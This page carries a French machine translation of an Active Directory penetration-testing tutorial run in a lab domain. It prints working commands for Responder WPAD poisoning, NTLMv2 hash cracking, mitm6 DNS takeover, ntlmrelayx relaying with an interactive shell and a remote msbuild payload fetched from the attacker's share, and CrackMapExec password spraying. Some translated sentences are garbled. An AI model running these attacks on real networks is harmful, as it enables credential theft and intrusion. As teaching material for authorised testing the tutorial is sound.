<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👨🏼‍🏫 🏼 👩🏽‍⚖️ Pentest Active Directory. Partie 1 🍆 💇🏾 ☦️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="La traduction de l'article a été préparée spécialement pour les étudiants du Pentest. Pratique des tests de pénétration . " 



 J'ai eu plusieurs cli...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Pentest Active Directory. Partie 1</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/481348/">  <i>La traduction de l'article a été préparée spécialement pour les étudiants du <a href="https://otus.pw/QXrl/">Pentest.</a></i>  <i><a href="https://otus.pw/QXrl/">Pratique des tests de pénétration</a> . <a href="https://otus.pw/QXrl/">"</a></i> <br><hr><br><img src="https://habrastorage.org/webt/p6/3r/kw/p63rkwok1ndkvwwmwfgwiekna6w.png"><br><br>  J'ai eu plusieurs clients qui sont venus me voir avant le pentest avec la certitude qu'ils étaient en bonne forme, car leur analyse de vulnérabilité n'a pas montré de vulnérabilités critiques, et qu'ils étaient prêts pour le pentest, uniquement pour que je reçoive les droits d'administrateur de domaine en quinze minutes, profitant simplement des erreurs de configuration dans AD. <br><a name="habracut"></a><br>  L'une des lacunes dans l'éducation que je vois dans les tests de pénétration est un manque de sensibilisation en ce qui concerne Active Directory Pentesting (AD).  Malheureusement, OSCP n'enseigne pas les tests AD, et même le cours SANS GPEN n'y touche guère.  Le but de cette série est d'aider à démontrer certaines des astuces, outils et techniques que j'ai utilisés dans le passé pour réussir des pentests utilisant la MA.  Il ne s'agit en aucun cas d'un guide exhaustif pour chaque méthode ou outil.  Tout au long de cette série, j'utiliserai Kali Linux 2019 et travaillerai dans mon domaine factice via des machines virtuelles. <br><br>  Commençons par définir une <b>cible</b> : l'objectif d'un test de pénétration est d'identifier tout vecteur d'attaque possible qu'un attaquant utilisera pour pénétrer dans un réseau.  Il <b>ne</b> s'agit <b>pas seulement</b> d'obtenir des droits d'administrateur de domaine, puis de se déconnecter. <br><br>  Maintenant que nous avons un objectif, nous devons prendre plusieurs mesures pour l'atteindre.  Voici un guide visuel (approximatif) du cycle de pentesting. <br><br><img src="https://habrastorage.org/webt/4h/xu/hi/4hxuhi10tttcfiblcafsfmdt7-e.png"><br>  <i>Publié par: Microsoft</i> <br><br>  <b>Synopsis</b> : Un client vous a engagé pour exécuter un test de pénétration sur son réseau qui utilise Active Directory.  On ne vous a rien donné.  Vous n'avez pas d'informations d'identification, pas de limites de test, pas de passe pour entrer par la porte d'entrée, mais vous parvenez à passer derrière quelqu'un et à trouver une pièce isolée avec un téléphone IP.  Vous débranchez votre téléphone IP, branchez votre ordinateur portable et vous retrouvez en ligne.  Et ensuite?  <b>Mise en œuvre</b> . <br><br><h3>  Phase I |  Implémentation </h3><br>  Sans informations d'identification, nous ne pouvons effectuer qu'une reconnaissance limitée, et la reconnaissance aura lieu à presque toutes les étapes du cycle, mais il y a plusieurs choses que nous pouvons faire immédiatement pour prendre pied dans le réseau.  Tout d'abord, puisque nous avons accès au réseau, vérifiez simplement sur quel sous-réseau nous travaillons via ifconfig ou ipconfig.  Après avoir reçu l'adresse IP, exécutez la commande ping dans nmap pour voir si d'autres périphériques sont disponibles. <br><br><pre><code class="plaintext hljs">nmap -sn 192.168.1.1/24</code> </pre> <br>  Si les appareils reviennent, vous êtes en affaires.  Si vous ne recevez rien, ICMP peut être désactivé, il n'y a aucun autre périphérique sur le réseau ou parce que vous n'avez pas été authentifié, vous ne pouvez pas communiquer avec d'autres périphériques et avez peut-être été bloqué par une solution de sécurité d'identité (telle que Cisco ISE).  Pour les besoins de l'article, supposons que plusieurs machines reviennent et que vous pouvez les envoyer avec succès. <br><br><hr><br>  <i><b>Outil</b></i> : <a href="https://github.com/SpiderLabs/Responder">Répondant</a> <br><br>  Ensuite, nous utiliserons un outil appelé <b>Responder</b> , ou, si vous n'êtes pas indifférent à Windows, <b>Inveigh</b> .  Ces deux outils recherchent une erreur très courante dans la configuration AD, ce qui conduit à la possibilité d'empoisonner WPAD et NBT-NS.  Par défaut, Windows est configuré pour rechercher un fichier de configuration de proxy automatique (PAC) via la découverte automatique de proxy Web (WPAD).  Il est important de noter que WPAD n'est pas le protocole qui effectue la recherche, mais juste un ensemble de procédures qui permettent au périphérique de trouver le fichier PAC.  La détection automatique d'un fichier PAC est utile pour les organisations car l'appareil enverra une diffusion demandant un fichier proxy et le recevra.  Cependant, bien sûr, il n'authentifie pas qui envoie le fichier proxy, ce qui permet à l'attaquant d'envoyer une fausse réponse, qui demande ensuite des informations d'identification. <br><br>  Dans Kali responder est installé par défaut. <br><br><pre> <code class="plaintext hljs">responder -I eth0 --wpad</code> </pre> <br>  Sur mon ordinateur Windows 7, j'ouvre Internet Explorer et vais sur Google, qui commence alors à rechercher le fichier WPAD.  Dans Responder, je vois comment la demande est arrivée, après quoi le Répondant répond automatiquement à la demande, à la suite de quoi la victime envoie son nom d'utilisateur et son mot de passe haché (au format NTLMv2). <br><br><img src="https://habrastorage.org/webt/4g/fo/wr/4gfowr6lflqcpzh1-cwcbs75vlo.png"><br><br>  Il y a plusieurs choses que nous pouvons faire avec ce hachage.  Nous pouvons essayer de le pirater ou de le relayer en utilisant un outil comme <code>ntlmrelay.py</code> .  J'ai parlé de la façon de traduire les hachages ntlm dans <a href="https://hausec.com/2017/10/25/automating-the-pentesting-process-how-llmnr-spoofing-can-lead-to-domain-admin-in-5-minutes/">cet article</a> , je vais donc passer au piratage, car c'est généralement exactement ce que je fais dans la pratique. <br><br>  Pour être honnête, je craque rarement les mots de passe sous Linux / Kali.  J'utilise le GPU nvidia, qui ne s'installe jamais correctement sur Kali, en plus il y a un HashcatGUI sur Windows qui rend le processus beaucoup plus facile, et c'est ce que j'utiliserai.  Je prends le hachage résultant, le place dans un fichier appelé <i>"hash.txt"</i> et y exécute plusieurs listes de mots / règles.  Mais dans ce cas, je viens de <code>rockyou.txt</code> et il a été piraté pendant une seconde. <br><br><img src="https://habrastorage.org/webt/mw/4x/ne/mw4xneie6ludbspzquxvhsuwjq8.png"><br>  <i>Mes paramètres pour HashcatGUI.</i> <br><br><img src="https://habrastorage.org/webt/km/ca/ze/kmcazexh-eid8rksx8uoybd5yye.png"><br>  <i>Mot de passe piraté - "Mot de passe!"</i> <br><br>  Maintenant que nous avons réussi à déchiffrer le mot de passe, nous avons les informations d'identification «Alice: mot de passe»! <br><br>  Avant de continuer, il y a plusieurs autres méthodes que je voudrais montrer au cas où le Répondant ne fonctionnerait pas. <br><br><hr><br>  <i><b>Outil</b></i> : <a href="https://github.com/fox-it/mitm6">mitm6</a> <br><br>  Supposons que le réseau client utilise un fichier PAC légitime et que votre usurpation ne fonctionne pas.  Il existe une autre méthode qui utilise IPv6 et DNS pour transmettre les informations d'identification à la cible.  Par défaut, IPv6 est activé et est en fait préférable à IPv4.  Cela signifie que si l'ordinateur possède un serveur DNS IPv6, il <i>préférera</i> IPv4.  De plus, par défaut, les machines Windows recherchent un serveur DNS IPv6 via des requêtes DHCPv6, ce qui signifie que si nous simulons un serveur DNS IPv6, nous pouvons contrôler efficacement la façon dont l'appareil demandera DNS.  En savoir plus à ce sujet <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">ici</a> . <br><br>  Téléchargez d' <a href="https://github.com/fox-it/mitm6">abord mitm6</a> . <br><br><pre> <code class="plaintext hljs">git clone https://github.com/fox-it/mitm6.git cd mitm6 pip install .</code> </pre> <br>  Exécutez-le ensuite sur le groupe de travail du réseau cible.  Comme nous avons précédemment <code>lab.local</code> au réseau, nous avons également obtenu les noms NetBIOS, en apprenant que le domaine cible est <code>lab.local</code> . <br><br>  Voici à quoi ressemblaient les paramètres IP cibles avant de commencer <code>mitm6</code> <br><br><img src="https://habrastorage.org/webt/3d/vv/vr/3dvvvrilsufnvgatvst4bwmmkgc.png"><br>  <i>Faites attention à un serveur DNS</i> <br>  J'ai ensuite lancé mitm6 <br><br><pre> <code class="plaintext hljs">mitm6 -d lab.local</code> </pre> <br><img src="https://habrastorage.org/webt/bc/sl/qm/bcslqmbg7zlncefnc-1xukg55rk.png"><br><br>  Et maintenant, les objectifs du serveur DNS ont changé <br><br><img src="https://habrastorage.org/webt/qm/qe/ko/qmqekoijtpdxp4d57ro02p3kr1u.png"><br>  <i>Notez l'adresse IPv6 comme serveur DNS.</i> <i><br></i> <br>  Maintenant, la vraie vulnérabilité est que Windows préfère IPv6 plutôt que IPv4, c'est-à-dire que maintenant je contrôle DNS. <br><br>  Alors maintenant, nous utilisons le fait que nous contrôlons le DNS en <code>ntlmrelayx.py</code> réponses WPAD via <code>ntlmrelayx.py</code> .  J'ai écrit un <a href="https://hausec.com/how-to-set-up-ntlmrelayx-py/">guide</a> sur la façon de l'installer. <br><br>  Avec mitm6 exécuté dans une fenêtre, ouvrez-en une autre et exécutez <code>ntlmrelayx.py</code> <br><br><pre> <code class="plaintext hljs">ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i</code> </pre> <br>  <i><code>-wh</code> : serveur hébergeant le fichier WPAD (IP attaquant)</i> <i><br></i>  <i><code>-t</code> : cible (vous ne pouvez pas transférer les informations d'identification vers le même appareil que vous fabriquez)</i> <i><br></i>  <i><code>-i</code> : shell interactif ouvert</i> <br><br><img src="https://habrastorage.org/webt/8p/wh/cu/8pwhcuwgx_6wyskxawrr5cq8db0.png"><br><br>  De là, vous pouvez vous connecter au système de contrôle et de surveillance (C2) de votre choix.  Dans ce cas, j'utilise SILENTTRINITY, donc j'utilise la commande -c pour exécuter ma commande, qui dans ce cas utilise MSBuild pour créer ma charge utile malveillante. <br><br><pre> <code class="xml hljs">ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.50/ --no-smb-server -c 'C:\Windows\Microsoft.NET\Framework64\v3.5\msbuild.exe \\192.168.218.129\SMB\msbuild.xml'</code> </pre> <br><img src="https://habrastorage.org/webt/mz/wg/la/mzwglak5n0kzty0vgqy4z7g5kya.png"><br><br>  Mais non, <code>msbuild.exe</code> ne crée pas de fichier XML dans ce cas, et je n'obtiens pas de connexion à SILENTTRINITY, car ce serait trop simple.  Au lieu de cela, je regarde mon serveur SMB et vois un hachage de relais <br><br><img src="https://habrastorage.org/webt/b_/vf/qk/b_vfqka5be-1bek_90jncfywhge.png"><br><br>  Ce que je pirate à mon tour. <br><br><img src="https://habrastorage.org/webt/s3/e5/qa/s3e5qaojtbishyvggzxt52orsdy.png"><br><br>  Et maintenant, nous avons les informations d'identification du réseau sans utiliser de répondeur. <br><br><hr><br>  <i><b>Outil</b></i> : <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> <br><br>  <b>CrackMapExec</b> est essentiellement un couteau pentester suisse.  Des attaques par pulvérisation de mots de passe et des transferts de hachage à l'exécution de commandes, il devrait figurer dans chaque ensemble d'outils pour les pentesters. <br><br>  Si tout le reste échoue, nous pouvons essayer d'utiliser une attaque par pulvérisation par mot de passe.  Il y a une raison pour laquelle cette méthode est la dernière, et c'est à cause d'un verrouillage par mot de passe.  Le blocage des mots de passe n'est pas aussi courant que vous le pensez, ce qui permet à un attaquant d'utiliser une attaque par dictionnaire par nom d'utilisateur.  L'obtention d'un nom d'utilisateur est la première étape qui peut être effectuée via OSINT et avec theHarvester.  Si nous n'avons pas de nom d'utilisateur OSINT, nous pouvons également donner à CrackMapExec (CME) une liste de noms d'utilisateurs, mais pour gagner du temps, supposons que nous avons un <b>nom d'utilisateur rsmith</b> . <br><br>  Si vous êtes à Kali, CrackMapExec devrait déjà être installé, si vous utilisez une version plus récente, mais sinon, vous pouvez l'installer <br><br><pre> <code class="plaintext hljs">apt-get install crackmapexec</code> </pre> <br>  Étant donné qu'à la suite de l'analyse, nous avons trouvé l'appareil sur le réseau, nous pouvons donner au CME une liste de mots de passe associés au nom d'utilisateur et essayer de se connecter. <br><br><pre> <code class="plaintext hljs">crackmapexec smb 192.168.218.40 -d lab.local -u rsmith -p ~/Documents/wordlists/fasttrack.txt --shares</code> </pre> <br>  Après quelques secondes, le mot de passe est trouvé. <br><br><img src="https://habrastorage.org/webt/uo/b7/ed/uob7edro_ir8xggvgxezdcqjjek.png"><br><br>  Identifiants trouvés! <br><br>  Cela peut sembler trop CTF, mais saison: l'année est une combinaison extrêmement populaire de mots de passe. <br><br>  Avec ces informations d'identification obtenues, nous avons maintenant un compte d'utilisateur.  Nous allons passer à l'escalade de privilèges dans la <a href="https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/">deuxième partie</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr481348/">https://habr.com/ru/post/fr481348/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr481338/index.html">Exploiter les vulnérabilités xss</a></li>
<li><a href="../fr481340/index.html">7 jours, 15 ingénieurs et 600 serveurs: Yandex.Money déménage dans un nouveau centre de données</a></li>
<li><a href="../fr481342/index.html">Sondage du vendredi: parler des langues</a></li>
<li><a href="../fr481344/index.html">Plans de l'équipe de la plateforme IntelliJ pour 2020</a></li>
<li><a href="../fr481346/index.html">5 changements majeurs dans l'industrie automobile</a></li>
<li><a href="../fr481350/index.html">Qui travaille au cosmodrome de Plesetsk</a></li>
<li><a href="../fr481352/index.html">DBA: effacement des enregistrements de clone d'une table sans PK</a></li>
<li><a href="../fr481354/index.html">TelegramBot. La fonctionnalité de base. Mouches séparément, côtelettes séparément. (2e partie)</a></li>
<li><a href="../fr481356/index.html">Merci, 2019</a></li>
<li><a href="../fr481358/index.html">C ++ Russie: comment c'était</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>